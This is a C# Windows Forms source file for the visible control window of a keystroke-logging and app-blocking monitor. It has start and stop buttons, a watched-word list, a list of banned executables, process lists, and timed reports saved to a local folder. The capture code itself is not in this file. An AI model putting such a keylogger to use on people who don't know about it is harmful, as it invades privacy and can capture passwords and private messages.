using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using reporter;

namespace keyLogger
{
    public partial class keyLogApp : Form
    {
        public keyLogApp()
        {
            InitializeComponent();
            _init();
        }
        private ObservableCollection<Keys> _keys = new ObservableCollection<Keys>();
        private void _init()
        {
            App.Instance.ReportDirChanged += App_ReportDirChanged;
            _initFileRepInterval();
            KeyLogger.Instance.FindMatchingWord += () =>
            {
                if (InvokeRequired)
                {
                    Invoke(new Action(_updWordReport));
                }
            };
            KeyLogger.KeyDown += ( key) =>
            {
                if (mainTabs.SelectedTab.Name.Equals("reportTab", StringComparison.CurrentCultureIgnoreCase))
                    _keyReportUpd();
            };
            processReportBox.DisplayMember = "ProcessName";
            AppControl.Instance.NewProcesses += (p) =>
            {
                if (InvokeRequired)
                    Invoke(new Action<List<Process>>(_processReport), p);
                else
                {
                    _processReport(p);
                }
            };
            AppControl.Instance.ProcessBanned += (p) =>
            {

                if (InvokeRequired)
                {
                    Invoke(new Action(_bannedAppsReportUpd));
                }
                else
                    _bannedAppsReportUpd();
            };
            App.Instance.ReportDone += () =>
            {
                if (InvokeRequired)
                    Invoke(new Action(_updAll));
                else
                {
                    _updAll();
                }
            };
        }

        private void _updAll()
        {
            _updWordReport();
            _keyReportUpd();
        }

        private void _updWordReport()
        {
            wordReportBox.DataSource = null;
            wordReportBox.DataSource = KeyLogger.Instance.WordsReport;
        }

        private void App_ReportDirChanged(string newValue)
        {
            reportPathBox.Text = newValue;
        }

        private void _initFileRepInterval()
        {
            reportIntervalBox.Items.Add(new TimeInterval { Time = 300000, Name = "5 minutes" });
            reportIntervalBox.Items.Add(new TimeInterval { Time = 600000, Name = "10 minutes" });
            reportIntervalBox.Items.Add(new TimeInterval { Time = 1200000, Name = "20 minutes" });
            reportIntervalBox.Items.Add(new TimeInterval { Time = 1800000, Name = "30 minutes" });
            reportIntervalBox.SelectedIndex = 0;
        }

        private void _bannedAppsReportUpd()
        {
            bannedReportBox.DataSource = null;
            bannedReportBox.DataSource = AppControl.Instance.Reports;
        }

        private void _processReport(List<Process> newProcesses)
        {
            processReportBox.DataSource = null;
            processReportBox.DataSource = newProcesses.Select(p => p.ProcessName).ToList();
        }


        #region CheckBox

        private void banAppsCheck_CheckedChanged(object sender, EventArgs e)
        {
            bannedAppPanel.Visible = banAppsCheck.Checked;
            App.Instance.BanApps = banAppsCheck.Checked;

        }
        private void logWordsCheck_CheckedChanged(object sender, EventArgs e)
        {
            logWordsPanel.Visible = logWordsCheck.Checked;
            App.Instance.LogWords = logWordsCheck.Checked;
        }
        private void logKeysCheck_CheckedChanged(object sender, EventArgs e)
        {

            if(!logKeysCheck.Checked)
                logWordsCheck.Checked=false;
            logWordsCheck.Enabled = logKeysCheck.Checked;
            App.Instance.LogKeys = logKeysCheck.Checked;
        }

        #endregion

        #region Buttons

        
        private void startBtn_Click(object sender, EventArgs e)
        {
            App.Instance.Start();
            reportTimer.Start();
            (startBtn.Enabled, stopBtn.Enabled) = (stopBtn.Enabled, startBtn.Enabled);
        }

        private void stopBtn_Click(object sender, EventArgs e)
        {
            App.Instance.Stop();

            (startBtn.Enabled, stopBtn.Enabled) = (stopBtn.Enabled, startBtn.Enabled);
        }

        private void delBanAppBtn_Click(object sender, EventArgs e)
        {
            if (banAppBox.SelectedItem == null) return;
            var app = banAppBox.SelectedItem as string;
            AppControl.Instance.RemoveBannedApp(app);
            _updApps();
        }

        private void addBanAppBtn_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog
            {
                Filter = "Execute files (*.exe)|*.exe"
            };
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                AppControl.Instance.AddBannedApp(ofd.FileName);
            }
            _updApps();
        }

        private void _updApps()
        {
            banAppBox.DataSource = null;
            banAppBox.DataSource = AppControl.Instance.BannedApps;
        }

        private void _updWords()
        {
            logWordsBox.DataSource = null;
            logWordsBox.DataSource = KeyLogger.Instance.ObserveWords;
        }
        private void delWordBtn_Click(object sender, EventArgs e)
        {
            if (logWordsBox.SelectedItem == null) return;
            var word = logWordsBox.SelectedItem as string;
            KeyLogger.Instance.RemoveWord(word);
        }

        private void updWordBtn_Click(object sender, EventArgs e)
        {
            if (!_checkWordBox()) return;
            if (logWordsBox.SelectedItem == null) return;
            var oldWord = logWordsBox.SelectedItem as string;
            var newWord = logWordTextBox.Text;
            KeyLogger.Instance.UpdateWord(oldWord, newWord);
            _updWords();
        }

        private void addWordBtn_Click(object sender, EventArgs e)
        {
            if (!_checkWordBox()) return;
            try
            {
                KeyLogger.Instance.AddWord(logWordTextBox.Text);
                _updWords();
            }
            catch (Exception exception)
            {
                tip.Show(exception.Message, logWordTextBox);
            }
        }

        private bool _checkWordBox()
        {
            if (string.IsNullOrEmpty(logWordTextBox.Text))
            {
                tip.Show("Empty", logWordTextBox);
                return false;
            }

            return true;
        }



        #endregion

        private void mainTabs_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (mainTabs.SelectedTab.Name)
            {
                case "mainSetupPanel":
                    break;
                case "reportTab":
                    _keyReportUpd();
                    break;
            }
        }

        private void _keyReportUpd()
        {
            mainReportBox.DataSource = null;
            mainReportBox.DataSource = KeyLogger.Reports.Reverse().ToList();
        }

        private void keyLogApp_Load(object sender, EventArgs e)
        {
            App.Instance.Load();
        }
        private void keyLogApp_FormClosing(object sender, FormClosingEventArgs e)
        {
            App.Instance.Save();
        }

       
        private void changeRepPath_Click(object sender, EventArgs e)
        {
            FolderBrowserDialog browser = new FolderBrowserDialog();
            if (browser.ShowDialog() == DialogResult.OK)
            {
                App.Instance.ReportDir = browser.SelectedPath;
            }
        }

        private void openRepDirBtn_Click(object sender, EventArgs e)
        {
            App.Instance.OpenReportDir();
            }
        

        private void reportToFileCheck_CheckedChanged(object sender, EventArgs e)
        {
            fileReportPanel.Enabled = reportToFileCheck.Checked;
            if (reportToFileCheck.Checked)
                reportTimer.Start();
            else
            {
                reportTimer.Stop();
            }
        }

        private void reportIntervalBox_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (reportIntervalBox.SelectedItem is TimeInterval interval)
                reportTimer.Interval = interval.Time;
        }

        private void manualReportBtn_Click(object sender, EventArgs e)
        {
            App.Instance.Report();
        }

        private void reportTimer_Tick(object sender, EventArgs e)
        {
            App.Instance.Report();
        }
      
    }
}
